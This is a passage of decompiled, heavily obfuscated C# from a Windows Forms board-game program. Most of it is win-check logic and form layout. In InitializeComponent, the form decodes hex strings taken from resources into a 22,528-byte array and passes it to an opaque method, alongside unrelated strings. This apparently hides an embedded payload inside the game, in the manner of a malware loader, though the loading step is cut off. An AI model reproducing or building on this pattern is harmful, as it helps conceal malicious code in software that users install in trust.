						num = (int)((num2 * 924188164) ^ 0x49BA1425);
						continue;
					}
					goto IL_0130;
				case 65u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 542786335) ^ -138869650;
						continue;
					}
					goto IL_017b;
				case 64u:
				{
					int num27;
					int num28;
					if (mem[num3, 2] == null)
					{
						num27 = -746561988;
						num28 = -746561988;
					}
					else
					{
						num27 = -2096052581;
						num28 = -2096052581;
					}
					num = num27 ^ (int)(num2 * 1289830753);
					continue;
				}
				case 63u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -1331341848) ^ 0x35EF17EB;
						continue;
					}
					goto IL_013c;
				case 62u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = -928978185;
						num11 = -928978185;
					}
					else
					{
						num10 = -1308199526;
						num11 = -1308199526;
					}
					num = num10 ^ ((int)num2 * -2033502239);
					continue;
				}
				case 61u:
					num3 = 0;
					num = (int)((num2 * 2050275961) ^ 0x6D2A41CB);
					continue;
				case 60u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 682034389) ^ 0x5BF3AFC6);
						continue;
					}
					goto IL_0324;
				case 59u:
					if (mem[2, num3].Square == mem[3, num3].Square)
					{
						goto IL_0130;
					}
					goto IL_013c;
				case 58u:
				{
					int num55;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = -999171069;
						num55 = -999171069;
					}
					else
					{
						num = -1748763733;
						num55 = -1748763733;
					}
					continue;
				}
				case 57u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)(num2 * 357626392) ^ -172934327;
						continue;
					}
					goto IL_00f1;
				case 56u:
				{
					int num45;
					int num46;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num45 = 427099681;
						num46 = 427099681;
					}
					else
					{
						num45 = 222464762;
						num46 = 222464762;
					}
					num = num45 ^ ((int)num2 * -906187419);
					continue;
				}
				case 55u:
				{
					int num35;
					int num36;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num35 = 1510094400;
						num36 = 1510094400;
					}
					else
					{
						num35 = 1414219179;
						num36 = 1414219179;
					}
					num = num35 ^ (int)(num2 * 159314039);
					continue;
				}
				case 54u:
				{
					int num25;
					int num26;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num25 = 432470231;
						num26 = 432470231;
					}
					else
					{
						num25 = 81559377;
						num26 = 81559377;
					}
					num = num25 ^ ((int)num2 * -270770485);
					continue;
				}
				case 53u:
				{
					int num15;
					int num16;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num15 = 870068800;
						num16 = 870068800;
					}
					else
					{
						num15 = 1829854254;
						num16 = 1829854254;
					}
					num = num15 ^ (int)(num2 * 791248122);
					continue;
				}
				case 52u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1626684288) ^ -1734661168;
						continue;
					}
					goto IL_017b;
				case 51u:
				{
					int num69;
					int num70;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num69 = 974046354;
						num70 = 974046354;
					}
					else
					{
						num69 = 300261591;
						num70 = 300261591;
					}
					num = num69 ^ ((int)num2 * -1663777677);
					continue;
				}
				case 50u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 259664318) ^ 0x731A6F7);
						continue;
					}
					goto IL_0130;
				case 49u:
				{
					int num67;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -530486597;
						num67 = -530486597;
					}
					else
					{
						num = -445920665;
						num67 = -445920665;
					}
					continue;
				}
				case 48u:
				{
					int num62;
					int num63;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num62 = -1288154015;
						num63 = -1288154015;
					}
					else
					{
						num62 = -1286601147;
						num63 = -1286601147;
					}
					num = num62 ^ (int)(num2 * 1339388186);
					continue;
				}
				case 46u:
					result = flag3;
					num = -1811558052;
					continue;
				case 45u:
				{
					int num58;
					int num59;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num58 = 1787519032;
						num59 = 1787519032;
					}
					else
					{
						num58 = 1642752995;
						num59 = 1642752995;
					}
					num = num58 ^ ((int)num2 * -1536723253);
					continue;
				}
				case 44u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -54447447) ^ 0x589F6BBD;
						continue;
					}
					goto IL_00f1;
				case 43u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1626573072) ^ 0x3C8FFF08;
						continue;
					}
					goto IL_00f1;
				case 42u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -529744754;
						continue;
					}
					goto IL_06af;
				case 41u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -577439019) ^ -923477692;
						continue;
					}
					goto IL_0130;
				case 40u:
					num = (int)(num2 * 286853032) ^ -1026349308;
					continue;
				case 39u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1803146132) ^ -1454961831;
						continue;
					}
					goto IL_0324;
				case 38u:
					flag3 = true;
					num = ((int)num2 * -1871899928) ^ -1164178314;
					continue;
				case 37u:
				{
					int num40;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = -912975611;
						num40 = -912975611;
					}
					else
					{
						num = -985458351;
						num40 = -985458351;
					}
					continue;
				}
				case 36u:
				{
					int num33;
					int num34;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num33 = 1554014961;
						num34 = 1554014961;
					}
					else
					{
						num33 = 1448584644;
						num34 = 1448584644;
					}
					num = num33 ^ ((int)num2 * -493806003);
					continue;
				}
				case 35u:
				{
					int num29;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = -1286456991;
						num29 = -1286456991;
					}
					else
					{
						num = -1988163054;
						num29 = -1988163054;
					}
					continue;
				}
				case 34u:
				{
					int num21;
					int num22;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num21 = 350377006;
						num22 = 350377006;
					}
					else
					{
						num21 = 2132568236;
						num22 = 2132568236;
					}
					num = num21 ^ (int)(num2 * 1986283411);
					continue;
				}
				case 33u:
				{
					int num13;
					int num14;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num13 = -986720977;
						num14 = -986720977;
					}
					else
					{
						num13 = -208718652;
						num14 = -208718652;
					}
					num = num13 ^ (int)(num2 * 22059936);
					continue;
				}
				case 32u:
				{
					int num4;
					int num5;
					if (mem[1, 1] != null)
					{
						num4 = -1093151254;
						num5 = -1093151254;
					}
					else
					{
						num4 = -938113199;
						num5 = -938113199;
					}
					num = num4 ^ (int)(num2 * 1533355282);
					continue;
				}
				case 31u:
					num = (int)((num2 * 44541909) ^ 0x56A63BD6);
					continue;
				case 30u:
				{
					int num68;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -59953205;
						num68 = -59953205;
					}
					else
					{
						num = -482777133;
						num68 = -482777133;
					}
					continue;
				}
				case 29u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -1029880435) ^ -78111880;
						continue;
					}
					goto IL_013c;
				case 28u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -1228025423) ^ 0x67BC3A60;
						continue;
					}
					goto IL_0130;
				case 27u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)((num2 * 1188903024) ^ 0x53DBA565);
						continue;
					}
					goto IL_0130;
				case 26u:
					flag3 = false;
					num = ((int)num2 * -2037522953) ^ -1688808552;
					continue;
				case 25u:
				{
					int num65;
					int num66;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num65 = -297504001;
						num66 = -297504001;
					}
					else
					{
						num65 = -1912115571;
						num66 = -1912115571;
					}
					num = num65 ^ ((int)num2 * -183316999);
					continue;
				}
				case 24u:
				{
					int num64;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1339203513;
						num64 = -1339203513;
					}
					else
					{
						num = -1056402376;
						num64 = -1056402376;
					}
					continue;
				}
				case 23u:
				{
					int num60;
					int num61;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num60 = 586949110;
						num61 = 586949110;
					}
					else
					{
						num60 = 765959402;
						num61 = 765959402;
					}
					num = num60 ^ (int)(num2 * 1522194634);
					continue;
				}
				case 22u:
				{
					int num53;
					int num54;
					if (mem[0, num3].Big != mem[1, num3].Big)
					{
						num53 = 271057701;
						num54 = 271057701;
					}
					else
					{
						num53 = 337693097;
						num54 = 337693097;
					}
					num = num53 ^ (int)(num2 * 174635122);
					continue;
				}
				case 21u:
				{
					int num50;
					int num51;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num50 = -67820447;
						num51 = -67820447;
					}
					else
					{
						num50 = -1561333918;
						num51 = -1561333918;
					}
					num = num50 ^ ((int)num2 * -1936272366);
					continue;
				}
				case 20u:
					num3++;
					num = -1193333171;
					continue;
				case 19u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1302871302) ^ 0x59AB3029;
						continue;
					}
					goto IL_0130;
				case 18u:
					flag = num3 < 4;
					num = -1302167162;
					continue;
				case 17u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 263905579) ^ 0x3D2ECD16);
						continue;
					}
					goto IL_0324;
				case 16u:
				{
					int num47;
					int num48;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num47 = -1304979726;
						num48 = -1304979726;
					}
					else
					{
						num47 = -515554899;
						num48 = -515554899;
					}
					num = num47 ^ (int)(num2 * 1595375275);
					continue;
				}
				case 14u:
					flag3 = true;
					num = (int)((num2 * 1461576351) ^ 0x43EBB2C5);
					continue;
				case 13u:
				{
					int num43;
					int num44;
					if (mem[0, 0] == null)
					{
						num43 = 1416459072;
						num44 = 1416459072;
					}
					else
					{
						num43 = 818505911;
						num44 = 818505911;
					}
					num = num43 ^ (int)(num2 * 425136551);
					continue;
				}
				case 12u:
					if (mem[0, num3] != null)
					{
						num = -1529185715;
						continue;
					}
					goto IL_013c;
				case 11u:
				{
					int num41;
					int num42;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num41 = -821379085;
						num42 = -821379085;
					}
					else
					{
						num41 = -1119682125;
						num42 = -1119682125;
					}
					num = num41 ^ (int)(num2 * 112614926);
					continue;
				}
				case 10u:
				{
					int num37;
					int num38;
					if (flag2)
					{
						num37 = 439777176;
						num38 = 439777176;
					}
					else
					{
						num37 = 1526661890;
						num38 = 1526661890;
					}
					num = num37 ^ ((int)num2 * -786542092);
					continue;
				}
				case 9u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)((num2 * 710152919) ^ 0x1C2F8709);
						continue;
					}
					goto IL_06af;
				case 8u:
				{
					int num31;
					int num32;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num31 = 841059937;
						num32 = 841059937;
					}
					else
					{
						num31 = 777683359;
						num32 = 777683359;
					}
					num = num31 ^ ((int)num2 * -766687862);
					continue;
				}
				case 7u:
					num30 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_00f2;
				case 6u:
					if (mem[0, 3] != null)
					{
						num = -576655708;
						continue;
					}
					goto IL_0324;
				case 5u:
				{
					int num23;
					int num24;
					if (mem[3, 3] != null)
					{
						num23 = 1639976688;
						num24 = 1639976688;
					}
					else
					{
						num23 = 2051144885;
						num24 = 2051144885;
					}
					num = num23 ^ (int)(num2 * 469273071);
					continue;
				}
				case 4u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -607240188) ^ 0x57C32060;
						continue;
					}
					goto IL_013c;
				case 3u:
				{
					int num17;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = -1385058834;
						num17 = -1385058834;
					}
					else
					{
						num = -2001090801;
						num17 = -2001090801;
					}
					continue;
				}
				case 2u:
				{
					int num12;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = -1175897080;
						num12 = -1175897080;
					}
					else
					{
						num = -1904284905;
						num12 = -1904284905;
					}
					continue;
				}
				case 1u:
				{
					int num6;
					int num7;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num6 = -558098032;
						num7 = -558098032;
					}
					else
					{
						num6 = -1623893469;
						num7 = -1623893469;
					}
					num = num6 ^ (int)(num2 * 1093205549);
					continue;
				}
				case 0u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -968171283) ^ -807188703;
						continue;
					}
					goto IL_013c;
				case 47u:
					break;
				default:
					{
						return result;
					}
					IL_013c:
					num = -295284680;
					num18 = -295284680;
					continue;
					IL_017b:
					num30 = 1;
					goto IL_00f2;
					IL_0130:
					num = -1108711352;
					num18 = -1108711352;
					continue;
					IL_06af:
					num30 = 0;
					goto IL_00f2;
					IL_00f2:
					flag2 = (byte)num30 != 0;
					num = -1831490404;
					continue;
					IL_00f1:
					num30 = 1;
					goto IL_00f2;
					IL_0324:
					num30 = 0;
					goto IL_00f2;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num5 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 327452466;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x48982488u) % 15u)
				{
				case 14u:
					num5++;
					num = 121473491;
					continue;
				case 13u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 1522885586;
						num6 = 1522885586;
					}
					else
					{
						num = 302839099;
						num6 = 302839099;
					}
					continue;
				}
				case 11u:
				{
					int num8;
					if (mem[num7, num5] != null)
					{
						num = 1961965156;
						num8 = 1961965156;
					}
					else
					{
						num = 2078313617;
						num8 = 2078313617;
					}
					continue;
				}
				case 10u:
					num = (int)((num2 * 1518649923) ^ 0xF484C26);
					continue;
				case 9u:
					num7 = 0;
					num = (int)((num2 * 345937822) ^ 0x76C9B2BB);
					continue;
				case 8u:
					num = (int)((num2 * 522294365) ^ 0x77D9ECFD);
					continue;
				case 7u:
					num5 = 0;
					num = 1096072175;
					continue;
				case 6u:
					flag = num7 < 4;
					num = 1271964993;
					continue;
				case 4u:
					flag2 = false;
					num = ((int)num2 * -795155883) ^ 0x7E8ED429;
					continue;
				case 3u:
					flag2 = true;
					num = ((int)num2 * -848444064) ^ -1919797273;
					continue;
				case 2u:
					num7++;
					num = (int)((num2 * 622874136) ^ 0x27D2B440);
					continue;
				case 1u:
					result = flag2;
					num = ((int)num2 * -533396871) ^ 0x6781579C;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 615414863;
						num4 = 615414863;
					}
					else
					{
						num3 = 1065269737;
						num4 = 1065269737;
					}
					num = num3 ^ ((int)num2 * -940929307);
					continue;
				}
				case 12u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -2129167079;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEA6637C1u) % 9u)
				{
				case 8u:
					num = (int)((num2 * 553356106) ^ 0x202F4727);
					continue;
				case 7u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -408529455) ^ 0x6269BD94;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -616197643) ^ 0x6615F73D;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -2049386760) ^ 0x2AEBA2E3;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -907958243) ^ -328267403;
					continue;
				case 2u:
					num = ((int)num2 * -1651648732) ^ -706761777;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -593495094) ^ 0x43ED8FE4;
					continue;
				default:
					return;
				case 5u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1086980929;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xF9006859u) % 9u)
				{
				case 7u:
					num = (int)((num2 * 1403855024) ^ 0x1FE5F760);
					continue;
				case 6u:
					((Form)this).Dispose(disposing);
					num = -1162427548;
					continue;
				case 5u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_002c;
				case 4u:
					num = ((int)num2 * -79616635) ^ 0x4EFA1436;
					continue;
				case 3u:
					if (disposing)
					{
						num = ((int)num2 * -222456281) ^ -575729379;
						continue;
					}
					num5 = 0;
					goto IL_002c;
				case 2u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -180050370;
						num4 = -180050370;
					}
					else
					{
						num3 = -1796085200;
						num4 = -1796085200;
					}
					num = num3 ^ ((int)num2 * -1518224636);
					continue;
				}
				case 1u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -1831875965) ^ -1659257926;
					continue;
				default:
					return;
				case 0u:
					break;
				case 8u:
					return;
					IL_002c:
					flag = (byte)num5 != 0;
					num = -885648650;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Expected O, but got Unknown
		components = Form1.smethod_52();
		object[] object_ = default(object[]);
		byte[] array = default(byte[]);
		int num3 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = -477772530;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF99F4E43u) % 131u)
				{
				case 130u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = (int)((num2 * 666591730) ^ 0x2DA9A020);
					continue;
				case 129u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -17908234) ^ 0x74B29609;
					continue;
				case 128u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = (int)((num2 * 1633945119) ^ 0x76FD0A0);
					continue;
				case 127u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1961126709) ^ -820993500;
					continue;
				case 126u:
					num = (int)((num2 * 1410053502) ^ 0x4B20E76E);
					continue;
				case 125u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 507674850) ^ 0x26A8583B);
					continue;
				case 124u:
					num = ((int)num2 * -234549040) ^ -1816963389;
					continue;
				case 123u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1362115842) ^ -2065118690;
					continue;
				case 122u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 1297908243) ^ -457785526;
					continue;
				case 121u:
					num = (int)((num2 * 1575687306) ^ 0x65BCE9F0);
					continue;
				case 120u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 163291058) ^ -2104817698;
					continue;
				case 119u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)((num2 * 1605556891) ^ 0x592B7B18);
					continue;
				case 118u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 1954988702) ^ -636360525;
					continue;
				case 117u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 186066603) ^ 0x41A219D0);
					continue;
				case 116u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -1111030649) ^ 0x141010DC;
					continue;
				case 115u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -1647733450) ^ 0x7C578DE1;
					continue;
				case 114u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 596963779) ^ 0x7C82A0E5);
					continue;
				case 113u:
					num = ((int)num2 * -1358226004) ^ -276523861;
					continue;
				case 112u:
					num = (int)((num2 * 1397007439) ^ 0x2FB522D6);
					continue;
				case 111u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 1613260855) ^ 0x1F025363);
					continue;
				case 110u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 648366836) ^ -312244278;
					continue;
				case 109u:
					num = ((int)num2 * -891382848) ^ -1558035848;
					continue;
				case 108u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -537449799) ^ 0x77AFC37A;
					continue;
				case 107u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1449209080) ^ -1070698326;
					continue;
				case 106u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 1396026670) ^ 0x1C63A6F9);
					continue;
				case 105u:
					num = ((int)num2 * -1338455719) ^ -1963962414;
					continue;
				case 104u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)(num2 * 1025690526) ^ -1321994917;
					continue;
				case 103u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1347604312) ^ 0x2622B002;
					continue;
				case 102u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -478901116) ^ 0x147C586C;
					continue;
				case 101u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 477056187) ^ -1687645430;
					continue;
				case 100u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1451218933) ^ 0x7A50A449;
					continue;
				case 99u:
					num = (int)((num2 * 1871863102) ^ 0x51C73B45);
					continue;
				case 98u:
					num = (int)((num2 * 2071287790) ^ 0x70C81B4D);
					continue;
				case 97u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -903284146) ^ 0x1EF8194F;
					continue;
				case 96u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 351168532) ^ -433605567;
					continue;
				case 95u:
					num = ((int)num2 * -1157404480) ^ -1771768127;
					continue;
				case 94u:
					num3 = 0;
					num = (int)(num2 * 1754056590) ^ -461077203;
					continue;
				case 92u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 1237792136) ^ 0x5C76B226);
					continue;
				case 91u:
					num = ((int)num2 * -416281717) ^ -554343541;
					continue;
				case 90u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 481581623) ^ 0x43A30484);
					continue;
				case 89u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1064797915) ^ 0x8CF1FF5;
					continue;
				case 88u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)((num2 * 746633923) ^ 0x704C814F);
					continue;
				case 87u:
					num = ((int)num2 * -1574950236) ^ 0x4E4EB8E7;
					continue;
				case 86u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -161904086) ^ 0x139FAFBE;
					continue;
				case 85u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)((num2 * 536286406) ^ 0xC737D73);
					continue;
				case 84u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1813218414) ^ 0x540FCF87;
					continue;
				case 83u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -873396410) ^ -1784013010;
					continue;
				case 82u:
					num = ((int)num2 * -866236600) ^ -1459898539;
					continue;
				case 81u:
					num = (int)(num2 * 1768999562) ^ -426578957;
					continue;
				case 80u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1637515423) ^ 0x2AAB3DA6;
					continue;
				case 79u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1443919913) ^ -353160624;
					continue;
				case 78u:
					num = (int)(num2 * 1043067963) ^ -778398035;
					continue;
				case 77u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 498415319) ^ 0x661A9AD4);
					continue;
				case 76u:
					num = (int)((num2 * 62347013) ^ 0x469DF3A6);
					continue;
				case 75u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1711079976) ^ -691619307;
					continue;
				case 74u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1999128777) ^ 0x12FD733F);
					continue;
				case 73u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)(num2 * 1704267267) ^ -1000140297;
					continue;
				case 72u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -336547278) ^ 0x5333ABDA;
					continue;
				case 71u:
					num = ((int)num2 * -1579291024) ^ 0x4088A69E;
					continue;
				case 70u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -2016889472) ^ -744131727;
					continue;
				case 69u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1878563532) ^ 0x31AA7176;
					continue;
				case 68u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -478531380) ^ -642700211;
					continue;
				case 67u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)(num2 * 1704112432) ^ -222936409;
					continue;
				case 66u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -182051891) ^ 0x6FE2F892;
					continue;
				case 65u:
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 1767869164) ^ 0x2E141244);
					continue;
				case 64u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 1828766189) ^ -1141341539;
					continue;
				case 63u:
					num = (int)(num2 * 1979072184) ^ -369817946;
					continue;
				case 62u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 60141030) ^ 0x40245A6C);
					continue;
				case 61u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -272940752) ^ 0x7EE64C3C;
					continue;
				case 60u:
					num = (int)(num2 * 883846397) ^ -273687389;
					continue;
				case 59u:
					array = new byte[22528];
					num = ((int)num2 * -235682927) ^ -1983074626;
					continue;
				case 58u:
					Form1.smethod_64((Control)(object)button1, 5);
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -1327609163) ^ 0x3FD93807;
					continue;
				case 57u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)((num2 * 1349403306) ^ 0x628B4651);
					continue;
				case 56u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -1258380913) ^ -89055753;
					continue;
				case 55u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)((num2 * 60028955) ^ 0x3A5A6233);
					continue;
				case 54u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1303978412) ^ 0x4E6E16C7;
					continue;
				case 53u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)(num2 * 1432340193) ^ -1780508466;
					continue;
				case 52u:
					num = ((int)num2 * -1264485656) ^ -1966190742;
					continue;
				case 51u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -2091831677) ^ -1444506722;
					continue;
				case 50u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -203264456) ^ 0x774F26FC;
					continue;
				case 49u:
					num = (int)(num2 * 770469033) ^ -223652176;
					continue;
				case 48u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1537184418) ^ -125032929;
					continue;
				case 47u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -246654861) ^ 0x3CDD36BA;
					continue;
				case 46u:
					num = ((int)num2 * -1642320771) ^ -1626213040;
					continue;
				case 45u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1078599313) ^ 0x68223AF2;
					continue;
				case 44u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -1984619652) ^ -1319424952;
					continue;
				case 43u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 48155900) ^ 0x554B14C1);
					continue;
				case 42u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
